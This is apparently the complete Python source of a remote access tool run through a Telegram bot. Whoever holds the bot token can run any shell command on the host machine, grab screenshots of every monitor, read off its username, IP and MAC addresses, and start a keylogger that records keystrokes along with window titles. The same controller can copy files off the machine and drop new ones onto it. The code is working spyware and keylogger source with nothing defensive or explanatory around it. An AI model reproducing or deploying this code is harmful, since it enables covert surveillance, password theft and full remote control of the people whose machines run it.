import os
import mss
import subprocess
import telebot
import requests
from telebot import types
from io import StringIO
import sys
import time
import traceback
import threading
import util
import config

# packages
if sys.platform == 'win32':
    import pyHook as hook_manager
    import pythoncom
else:
    import pyxhook as hook_manager

abort = False
window = None
max_size = 4000
logs = StringIO()
threads = {}
results = {}

bot = telebot.TeleBot(config.token)
decode_charset="utf-8"
hint_cmd=0
def download_file(url,filename):
    if len(filename) > 0:
        local_filename = filename
    else:
        local_filename = url.split('/')[-1]
    # NOTE the stream=True parameter below
    r=requests.get(url, stream=True)
    r.raise_for_status()
    with open(local_filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=8192): 
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                # f.flush()
    return local_filename

def shell(query):
    global decode_charset
    cmd = "bash"   #specify your cmd command
    process = subprocess.Popen(query,shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    out = process.stdout.read() + process.stderr.read()
    return out.decode(decode_charset)
 
@bot.message_handler(commands=["cmd"])
def cmd(message):
    if message.text:
        try:
            result=shell(message.text[5:])
            if result is not None:
                if len(result)>3000:
                    for i in range(0,1+int(round(len(result)/3000))):	
                        bot.send_message(message.chat.id, result[i*3000:i*3000+2999])
                else:
                    bot.send_message(message.chat.id, result)
        except Exception as error:
            bot.send_message(message.chat.id, "Error: " +str(error))

@bot.message_handler(commands=["screenshot"])
def screenshot(message):
    try:
        with mss.mss() as screen:
            for m in screen.monitors:
                img = screen.grab(m)
                data = util.png(img)
                bot.send_photo(message.chat.id, photo=data)
    except Exception as e:
        traceback.print_exc()

@bot.message_handler(commands=["info"])
def info(message):
    bot.send_message(message.chat.id, f"{util.username()}@{util.device()}({util.platform()}-x{util.architecture()}) {util.local_ip()} / {util.public_ip()} / {util.mac_address()}")

@bot.message_handler(commands=["cd"])
def cd(message):
    try:
        os.chdir(message.text[4:])
    except Exception as error:
        bot.send_message(message.chat.id, "Error: " +str(error))

@bot.message_handler(commands=["charset"])
def charset(message):
    global decode_charset
    if len(message.text[9:]) >0: 
        decode_charset=message.text[9:]
    else:
        bot.send_message(message.chat.id, decode_charset)

@bot.message_handler(commands=["help"])
def charset(message):
    bot.send_message(message.chat.id, """Remote bot commands:
/help - get help
/charset [charset] - set/get charset
/cd [folder] - change folder
/screenshot - make and send screenshot of screen
/cmd [command] - run shell command
/get [filename] - download file <50Mb
-------------------------------------
any other message will be as a command
upload files via attach
 """)

def _event(event):
    global logs
    global window
    try:
        if event.WindowName != window:
            window = event.WindowName
            logs.write("\n[{}]\n".format(window))
        if event.Ascii > 32 and event.Ascii < 127:
            logs.write(chr(event.Ascii))
        elif event.Ascii == 32:
            logs.write(' ')
        elif event.Ascii in (10,13):
            logs.write('\n')
        elif event.Ascii == 8:
            logs.write('<BACKSPACE>')
        elif event.Ascii == 9:
            logs.write('<TAB>')
        elif event.Ascii == 27:
            logs.write('<ESC>')
        else:
            logs.write(f"<KEY_{event.Ascii}>")
            pass
    except Exception as e:
        traceback.print_exc()
    return True

def _run_windows():
    global abort
    while True:
        hm = hook_manager.HookManager()
        hm.KeyDown = _event
        hm.HookKeyboard()
        pythoncom.PumpMessages()
        if abort:
            break

def _run():
    global abort
    hm = hook_manager.HookManager()
    hm.KeyDown = _event
    hm.HookKeyboard()
    hm.start()
    while True:
        time.sleep(0.1)
        if abort:
            break   

@bot.message_handler(commands=["getkeylog"])
def getkeylog(message):
    result=logs.getvalue()
    if len(result)>3000:
        for i in range(0,1+int(round(len(result)/3000))):	
            bot.send_message(message.chat.id, result[i*3000:i*3000+2999])
    else:
        bot.send_message(message.chat.id, result)

@bot.message_handler(commands=["keylog"])
def keylog(message):
    global threads
    try:
        if 'keylogger' not in threads or not threads['keylogger'].is_alive():
            if os.name == 'nt':
                threads['keylogger'] = threading.Thread(target=_run_windows, name=time.time())
            else:
                threads['keylogger'] = threading.Thread(target=_run, name=time.time())
            threads['keylogger'].start()
    except Exception as e:
        traceback.print_exc()

@bot.message_handler(commands=["get"])
def get(message):
    if os.path.getsize(message.text[5:]) >  52428800 :
        bot.send_message(message.chat.id, "Size is bigger than 50Mb: " +str(os.path.getsize(message.text[5:])))
    else:
        bot.send_document(message.chat.id, open(message.text[5:], 'rb'))

@bot.message_handler(content_types=['document'])
def handle_text_doc(message):
    f=bot.get_file(file_id=message.document.file_id)
    try:
        download_file("https://api.telegram.org/file/bot"+config.token+"/"+f.file_path,message.document.file_name)
    except Exception as error:
        bot.send_message(message.chat.id, "Error: " +str(error))

@bot.message_handler()
def other_messages(message):
    global hint_cmd
    message.text="/cmd "+message.text
    cmd(message)

if __name__ == '__main__':
    bot.polling(none_stop=True)
